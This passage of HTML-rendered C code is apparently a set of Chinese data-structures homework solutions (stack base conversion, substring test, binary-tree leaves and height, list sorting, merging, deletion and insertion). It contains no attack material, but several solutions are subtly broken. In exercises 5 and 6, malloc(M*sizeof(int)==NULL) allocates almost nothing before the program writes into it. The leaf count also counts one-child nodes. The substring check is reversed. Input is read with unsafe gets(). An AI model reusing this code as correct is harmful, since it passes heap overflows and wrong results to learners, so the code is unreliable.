selemtype;</span><br><span class="line"></span><br><span class="line">typedef struct stack</span><br><span class="line">&#123;</span><br><span class="line">selemtype *base;</span><br><span class="line">selemtype *top;</span><br><span class="line">int stacksize;</span><br><span class="line">&#125;sqstack;</span><br><span class="line"></span><br><span class="line">status initstack(sqstack &amp;s)</span><br><span class="line">&#123;</span><br><span class="line">s.base=(selemtype *)malloc(M*sizeof (selemtype));</span><br><span class="line">if(!s.base) return overflow;</span><br><span class="line">s.top=s.base;</span><br><span class="line">s.stacksize=M;</span><br><span class="line">return ok;</span><br><span class="line">&#125;</span><br><span class="line">status push(sqstack &amp;s,selemtype e)</span><br><span class="line">&#123;</span><br><span class="line">if(s.top-s.base&gt;=s.stacksize-1) return error;</span><br><span class="line">*s.top++=e;</span><br><span class="line">return ok;</span><br><span class="line">&#125;</span><br><span class="line">status pop(sqstack &amp;s,selemtype &amp;e)</span><br><span class="line">&#123;</span><br><span class="line">if(s.top==s.base) return error;</span><br><span class="line">e=*--s.top;</span><br><span class="line">return ok;</span><br><span class="line">&#125;</span><br><span class="line">int stackempty(sqstack s)</span><br><span class="line">&#123;  </span><br><span class="line">return s.top==s.base;</span><br><span class="line">&#125;</span><br><span class="line">void conversion()</span><br><span class="line">&#123;  </span><br><span class="line">int n,p;</span><br><span class="line">stack s;</span><br><span class="line">selemtype e;</span><br><span class="line">initstack(s);</span><br><span class="line">printf(&quot;请输入待转换数:\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">printf(&quot;请输入转换进制(2,8,16):\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;p);</span><br><span class="line">while(n)</span><br><span class="line">&#123;</span><br><span class="line">push(s,n%p);</span><br><span class="line">n=n/p;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;输出转换后的数：\n&quot;); </span><br><span class="line">while(!stackempty(s))</span><br><span class="line">&#123;</span><br><span class="line">pop(s,e);</span><br><span class="line">if(e&gt;9)</span><br><span class="line">&#123;</span><br><span class="line">e=e+55;</span><br><span class="line">printf(&quot;%c&quot;,e);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">printf(&quot;%d&quot;,e);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">conversion();</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2、从键盘上输入二个定长串s1与s2，试编写一个算法判断s1是否</span><br><span class="line">是s2的子串，如果是则输出１否则输出０</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define M 255</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef  char sstring[M+1];</span><br><span class="line"></span><br><span class="line">void sstringassign(char s[],sstring &amp;t )</span><br><span class="line">&#123;</span><br><span class="line">int i=0;</span><br><span class="line">t[0]=strlen(s);</span><br><span class="line">for(i=0;i&lt;t[0];i++)</span><br><span class="line">t[i+1]=s[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int sstringover(sstring s1, sstring s2)</span><br><span class="line">&#123;</span><br><span class="line">int i, j;</span><br><span class="line">i = j = 1;</span><br><span class="line"></span><br><span class="line">while(i &lt;= s1[0] &amp;&amp; j&lt;=s2[0])</span><br><span class="line">&#123;</span><br><span class="line">if(s1[i] == s2[j])</span><br><span class="line">&#123;</span><br><span class="line">i++;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">i = i - j + 2;</span><br><span class="line">j = 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(j&gt;s2[0])</span><br><span class="line">return 1;</span><br><span class="line">else </span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char s1[255],s2[255];</span><br><span class="line">sstring t1,t2;</span><br><span class="line">int n,m;</span><br><span class="line">printf(&quot;请输入字串s1:\n&quot;);</span><br><span class="line">gets(s1);</span><br><span class="line">sstringassign(s1,t1);</span><br><span class="line">printf(&quot;请输入字串s2:\n&quot;);</span><br><span class="line">gets(s2);</span><br><span class="line">sstringassign(s2,t2);</span><br><span class="line">printf(&quot;%d&quot;,sstringover(t1,t2));</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">3、假设二叉树采用二叉链表存储结构，试设计一个算法求二叉树的叶子结点数</span><br><span class="line">并输出所有的叶子结点</span><br><span class="line">输入 abc##d##ef##g##</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define M 255</span><br><span class="line"></span><br><span class="line">typedef char  elemtype;</span><br><span class="line">typedef int status;</span><br><span class="line"></span><br><span class="line">typedef struct bitnode</span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct bitnode *lchild,*rchild;</span><br><span class="line">&#125;Bitnode ,*Bitree;</span><br><span class="line"></span><br><span class="line">status creatbitree(Bitree &amp;t)</span><br><span class="line">&#123;</span><br><span class="line">elemtype c;</span><br><span class="line">c=getchar();</span><br><span class="line">if(c==&#x27;#&#x27;)t=NULL;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">t=(Bitree)malloc(sizeof(Bitnode));</span><br><span class="line">t-&gt;data=c;</span><br><span class="line">creatbitree(t-&gt;lchild);</span><br><span class="line">creatbitree(t-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">return ok;</span><br><span class="line">&#125;</span><br><span class="line">void preor(Bitree t,int &amp;num)</span><br><span class="line">&#123;</span><br><span class="line">if(t)</span><br><span class="line">&#123;</span><br><span class="line">if(!(t-&gt;lchild&amp;&amp;t-&gt;rchild))</span><br><span class="line">    &#123;</span><br><span class="line">num++;</span><br><span class="line">  printf(&quot;%c &quot;,t-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">preor(t-&gt;lchild,num);</span><br><span class="line">preor(t-&gt;rchild,num);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">Bitree T;</span><br><span class="line">int n=0;</span><br><span class="line">printf(&quot;以先根次序输入二叉树节点值以#好为空节点\n&quot;);</span><br><span class="line">creatbitree(T);</span><br><span class="line">printf(&quot;请输出叶子节点值:\n&quot;);</span><br><span class="line">preor(T,n);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">printf(&quot;请输出叶子节点个数:\n&quot;);</span><br><span class="line">printf(&quot;%d\n&quot;,n);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">4.假设二叉树采用二叉链表存储结构，试设计一个算法求二叉树的高度。</span><br><span class="line">输入 abc##d##ef##g##</span><br><span class="line"></span><br><span class="line">#include&quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">#include&quot;stdlib.h&quot; </span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define ok  1</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef char elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct bitnode</span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct bitnode *lchild,*rchild;</span><br><span class="line">&#125;Bitnode,*Bitree;</span><br><span class="line"></span><br><span class="line">void creatbitree(Bitree &amp;t)</span><br><span class="line">&#123;</span><br><span class="line">elemtype c;</span><br><span class="line">c=getchar();</span><br><span class="line">if(c==&#x27;#&#x27;)t=NULL;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">t=(Bitree)malloc(sizeof(Bitnode));</span><br><span class="line">t-&gt;data=c;</span><br><span class="line">creatbitree(t-&gt;lchild);</span><br><span class="line">creatbitree(t-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int height(Bitree t)</span><br><span class="line">&#123; </span><br><span class="line">    int n,m;</span><br><span class="line">if(t==NULL)return 0;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">       m=height(t-&gt;lchild );</span><br><span class="line">   n=height(t-&gt;rchild );</span><br><span class="line">return m&gt;n?++m:++n;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">Bitree T;</span><br><span class="line">printf(&quot;请以先根次序输入一棵二叉树空节点用&#x27;#&#x27;表示:\n&quot;);</span><br><span class="line">creatbitree(T);</span><br><span class="line">printf(&quot;请输出二叉树的高度:\n&quot;);</span><br><span class="line">printf(&quot;%d &quot;,height(T));</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5、已知一个带头结点的单链表la，其中la=&#123;a1,a2,...an&#125;， 试设计一个</span><br><span class="line">算法将其中从小到大进行排序 ，再输出</span><br><span class="line"></span><br><span class="line">#include&quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">#include&quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define M 100</span><br><span class="line"></span><br><span class="line">typedef struct list</span><br><span class="line">&#123;</span><br><span class="line">int *e;</span><br><span class="line">int len;</span><br><span class="line">int size;</span><br><span class="line"> &#125; sqlist;</span><br><span class="line"></span><br><span class="line"> void creat(list &amp;s)</span><br><span class="line"> &#123;</span><br><span class="line"> s.e=(int*)malloc(M*sizeof(int)==NULL);</span><br><span class="line"> s.len=0;</span><br><span class="line"> s.size=M;</span><br><span class="line"> &#125;</span><br><span class="line"> void input(list &amp;l,int n)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> l.len=n;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> scanf(&quot;%d&quot;,i);</span><br><span class="line"> &#125;</span><br><span class="line"> void output(list l)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> printf(&quot;%d &quot;,*i);</span><br><span class="line"> &#125;</span><br><span class="line"> void sort(list &amp;l)</span><br><span class="line"> &#123;</span><br><span class="line"> int elem;</span><br><span class="line"> int *i,*j;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len-1;i++)</span><br><span class="line"> &#123;</span><br><span class="line"> for(j=i+1;j&lt;l.e+l.len;j++)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if(*i&gt;*j)</span><br><span class="line">&#123;</span><br><span class="line">elem=*i;</span><br><span class="line">*i=*j;</span><br><span class="line">*j=elem;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line"> &#123;</span><br><span class="line"> list s;</span><br><span class="line"> int n;</span><br><span class="line"> creat(s);</span><br><span class="line"> printf(&quot;请输入顺序表的长度n:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line"> printf(&quot;请输入顺序表的值：\n&quot;);</span><br><span class="line"> input(s,n);</span><br><span class="line"> printf(&quot;请其从小到大进行排序输出:\n&quot;);</span><br><span class="line">    sort(s);</span><br><span class="line"> output(s);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6、已知二个单向有序链表la与lb，其中la=&#123;a1,a2,...an&#125;，lb=&#123;b1,b2,...bm&#125;，</span><br><span class="line"> 试设计一个算法将它们合并到单链表lc中，且lc仍然有序，再输出 。</span><br><span class="line"></span><br><span class="line">#include&quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">#include&quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define M 100</span><br><span class="line"></span><br><span class="line">typedef struct list</span><br><span class="line">&#123;</span><br><span class="line">int *e;</span><br><span class="line">int len;</span><br><span class="line">int size;</span><br><span class="line"> &#125; sqlist;</span><br><span class="line"></span><br><span class="line"> void creat(list &amp;s)</span><br><span class="line"> &#123;</span><br><span class="line"> s.e=(int*)malloc(M*sizeof(int)==NULL);</span><br><span class="line"> s.len=0;</span><br><span class="line"> s.size=M;</span><br><span class="line"> &#125;</span><br><span class="line"> void input(list &amp;l,int n)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> l.len=n;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> scanf(&quot;%d&quot;,i);</span><br><span class="line"> &#125;</span><br><span class="line"> void output(list l)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> printf(&quot;%d  &quot;,*i);</span><br><span class="line"> &#125;</span><br><span class="line"> void hblist(list la,list lb,list &amp;lc)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i,*j,*t;</span><br><span class="line"> lc.len=la.len+lb.len;</span><br><span class="line"> t=lc.e;</span><br><span class="line"> for(i=la.e;i&lt;la.e+la.len;i++)</span><br><span class="line"> &#123;</span><br><span class="line"> *t=*i;</span><br><span class="line"> t++;&#125;</span><br><span class="line"> for(j=lb.e;j&lt;lb.e+lb.len;j++)</span><br><span class="line"> &#123;</span><br><span class="line"> *t=*j;</span><br><span class="line"> t++;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> void sort(list &amp;l)</span><br><span class="line"> &#123;</span><br><span class="line"> int elem;</span><br><span class="line"> int *i,*j;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len-1;i++)</span><br><span class="line"> &#123;</span><br><span class="line"> for(j=i+1;j&lt;l.e+l.len;j++)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if(*i&gt;=*j)</span><br><span class="line">&#123;</span><br><span class="line">elem=*i;</span><br><span class="line">*i=*j;</span><br><span class="line">*j=elem;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> int main()</span><br><span class="line"> &#123;</span><br><span class="line"> list la,lb,lc;</span><br><span class="line"> int n,m;</span><br><span class="line"> creat(lb);</span><br><span class="line"> creat(la);</span><br><span class="line"> creat(lc);</span><br><span class="line"> printf(&quot;请输入顺序表la的长度n:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line"> printf(&quot;请输入顺序表la的值：\n&quot;);</span><br><span class="line"> input(la,n);</span><br><span class="line">    printf(&quot;请输入顺序表lb的长度m:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;m);</span><br><span class="line"> printf(&quot;请输入顺序表lb的值：\n&quot;);</span><br><span class="line"> input(lb,m);</span><br><span class="line"> printf(&quot;合并la和lb并有序输出lc：\n&quot;);</span><br><span class="line"> hblist(la,lb,lc);</span><br><span class="line"> sort(lc);</span><br><span class="line"> output(lc);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7.设计一个算法实现在带头结点的单向链表中删除给定值的结点。（链表中的数据元素值均不相同） </span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef int elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct Lnode                 </span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct  Lnode *next;</span><br><span class="line">&#125; Lnode,*linklist;</span><br><span class="line">void input1(linklist &amp;L,int n)</span><br><span class="line">&#123;</span><br><span class="line">linklist r,s;</span><br><span class="line">L=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">L-&gt;next=NULL;</span><br><span class="line">r=L;</span><br><span class="line">printf(&quot;请输入%d个节点的数据：\n&quot;,n);</span><br><span class="line">for(int i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">s=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;s-&gt;data);</span><br><span class="line">r-&gt;next=s;</span><br><span class="line">r=s;</span><br><span class="line">&#125;</span><br><span class="line">r-&gt;next=NULL;</span><br><span class="line">&#125;</span><br><span class="line">void output(linklist L)</span><br><span class="line">&#123;</span><br><span class="line">linklist p;</span><br><span class="line">p=L-&gt;next;</span><br><span class="line">printf(&quot;输出链表中的值：\n&quot;);</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;,p-&gt;data);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void  delte(linklist &amp;s,int e)</span><br><span class="line">&#123;</span><br><span class="line">linklist p,q;</span><br><span class="line">p=s-&gt;next;</span><br><span class="line">q=s;</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">if(p-&gt;data==e)</span><br><span class="line">&#123;</span><br><span class="line">q-&gt;next=p-&gt;next;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">q=q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist L;</span><br><span class="line">int n,i;</span><br><span class="line">elemtype e;</span><br><span class="line">printf(&quot;请输入链表节点个数n的值:\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">input1(L,n);</span><br><span class="line">printf(&quot;请在您输入的链表的值中输入要删除的节点的值：\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;e);</span><br><span class="line">delte(L,e);</span><br><span class="line">output(L);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">8.试设计一个算法，将单链表中值最小的那个结点删除。</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef int elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct Lnode                 </span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct  Lnode *next;</span><br><span class="line">&#125; Lnode,*linklist;</span><br><span class="line">void input1(linklist &amp;L,int n)</span><br><span class="line">&#123;</span><br><span class="line">linklist r,s;</span><br><span class="line">L=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">L-&gt;next=NULL;</span><br><span class="line">r=L;</span><br><span class="line">printf(&quot;请输入%d个节点的数据：\n&quot;,n);</span><br><span class="line">for(int i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">s=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;s-&gt;data);</span><br><span class="line">r-&gt;next=s;</span><br><span class="line">r=s;</span><br><span class="line">&#125;</span><br><span class="line">r-&gt;next=NULL;</span><br><span class="line">&#125;</span><br><span class="line">void output(linklist L)</span><br><span class="line">&#123;</span><br><span class="line">linklist p;</span><br><span class="line">p=L-&gt;next;</span><br><span class="line">printf(&quot;输出链表中的值：\n&quot;);</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;,p-&gt;data);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">int blist(linklist s)</span><br><span class="line">&#123;</span><br><span class="line">linklist p;</span><br><span class="line">p=s-&gt;next;</span><br><span class="line">elemtype t=0;</span><br><span class="line">t=p-&gt;data;</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">t=t&lt;p-&gt;data?t:p-&gt;data;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">return t;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void  delte(linklist &amp;s,int e)</span><br><span class="line">&#123;</span><br><span class="line">linklist p,q;</span><br><span class="line">p=s-&gt;next;</span><br><span class="line">q=s;</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">if(p-&gt;data==e)</span><br><span class="line">&#123;</span><br><span class="line">q-&gt;next=p-&gt;next;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">q=q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist s;</span><br><span class="line">int n;</span><br><span class="line">printf(&quot;请输入链长:\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">input1(s,n);</span><br><span class="line">printf(&quot;删除最小的节点值后输出；\n&quot;);</span><br><span class="line">delte(s,blist(s));</span><br><span class="line">output(s);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9、试设计一个算法，将单链表中值最大的那个结点删除</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef int elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct Lnode                 </span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct  Lnode *next;</span><br><span class="line">&#125; Lnode,*linklist;</span><br><span class="line"></span><br><span class="line">void input1(linklist &amp;L,int n)</span><br><span class="line">&#123;</span><br><span class="line">linklist r,s;</span><br><span class="line">L=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">L-&gt;next=NULL;</span><br><span class="line">r=L;</span><br><span class="line">printf(&quot;请输入%d个节点的数据：\n&quot;,n);</span><br><span class="line">for(int i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">s=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;s-&gt;data);</span><br><span class="line">r-&gt;next=s;</span><br><span class="line">r=s;</span><br><span class="line">&#125;</span><br><span class="line">r-&gt;next=NULL;</span><br><span class="line">&#125;</span><br><span class="line">void output(linklist L)</span><br><span class="line">&#123;</span><br><span class="line">linklist p;</span><br><span class="line">p=L-&gt;next;</span><br><span class="line">printf(&quot;输出链表中的值：\n&quot;);</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;,p-&gt;data);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">int blist(linklist s)</span><br><span class="line">&#123;</span><br><span class="line">linklist p;</span><br><span class="line">p=s-&gt;next;</span><br><span class="line">elemtype t=0;</span><br><span class="line">t=p-&gt;data;</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">t=t&gt;p-&gt;data?t:p-&gt;data;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">return t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Delete(linklist &amp;s,int e)</span><br><span class="line">&#123;</span><br><span class="line">linklist p,q;</span><br><span class="line">p=s-&gt;next;</span><br><span class="line">q=s;</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">if(p-&gt;data==e)</span><br><span class="line">&#123;</span><br><span class="line">q-&gt;next=p-&gt;next;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">q=q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist s;</span><br><span class="line">int n;</span><br><span class="line">printf(&quot;请输入链长:\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">input1(s,n);</span><br><span class="line">printf(&quot;删除最大的节点值后\n&quot;);</span><br><span class="line">Delete(s,blist(s));</span><br><span class="line">output(s);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10/*试设计一个算法，使得在一个有序的单链表中插入一个元素后仍然有序。</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;limits.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int DataType;</span><br><span class="line"></span><br><span class="line">typedef struct LNode* PtrToLNode;</span><br><span class="line">struct LNode&#123;</span><br><span class="line">DataType Data;</span><br><span class="line">PtrToLNode Next;</span><br><span class="line">&#125;;</span><br><span class="line">typedef PtrToLNode List;</span><br><span class="line">typedef PtrToLNode Position;</span><br><span class="line">List CreatList()</span><br><span class="line">&#123;</span><br><span class="line">List L=(List)malloc(sizeof(struct LNode));</span><br><span class="line">int n;</span><br><span class="line">int i;</span><br><span class="line">PtrToLNode h;</span><br><span class="line">PtrToLNode NewNode;</span><br><span class="line">printf(&quot;请输入链表长度：\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">printf(&quot;请输入链表元素：\n&quot;); </span><br><span class="line">h=L;</span><br><span class="line">for(i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">NewNode=(PtrToLNode)malloc(sizeof(struct LNode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;NewNode-&gt;Data);</span><br><span class="line">h-&gt;Next=NewNode;</span><br><span class="line">h=NewNode;</span><br><span class="line">&#125;</span><br><span class="line">h-&gt;Next=NULL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf(&quot;输出链表元素：\n&quot;);</span><br><span class="line">return L;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Position Find_First_Max(List L,DataType val)&#123; //找链中第一个比val大的pos</span><br><span class="line">Position h;</span><br><span class="line">for(h=L-&gt;Next;h &amp;&amp; val &gt;= (h-&gt;Data); h=h-&gt;Next);</span><br><span class="line">return h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Insert(List L,Position pos,DataType val)</span><br><span class="line">&#123;</span><br><span class="line">Position pre;</span><br><span class="line">PtrToLNode NewNode;</span><br><span class="line">for(pre=L;pre-&gt;Next!=pos;pre=pre-&gt;Next);//找pos前面 pre</span><br><span class="line"></span><br><span class="line">NewNode=(PtrToLNode)malloc(sizeof(struct LNode));</span><br><span class="line">NewNode-&gt;Data=val;</span><br><span class="line">NewNode-&gt;Next=pre-&gt;Next;</span><br><span class="line">pre-&gt;Next=NewNode;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Print(List L)</span><br><span class="line">&#123;</span><br><span class="line">PtrToLNode h;</span><br><span class="line">for(h=L-&gt;Next;h;h=h-&gt;Next)</span><br><span class="line">printf(&quot;%d &quot;,h-&gt;Data);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int val;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">List L=CreatList();</span><br><span class="line">Print(L);</span><br><span class="line">printf(&quot;输入一个数进行插入：\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;val);</span><br><span class="line">Insert(L,Find_First_Max(L,val),val);</span><br><span class="line">printf(&quot;输出插入一个元素后的链表：\n&quot;);</span><br><span class="line">Print(L);</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">11、//编写一个算法，将带头结点的单向链表拆分成一个奇数链表和一个</span><br><span class="line">偶数链表，并分别输出</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span 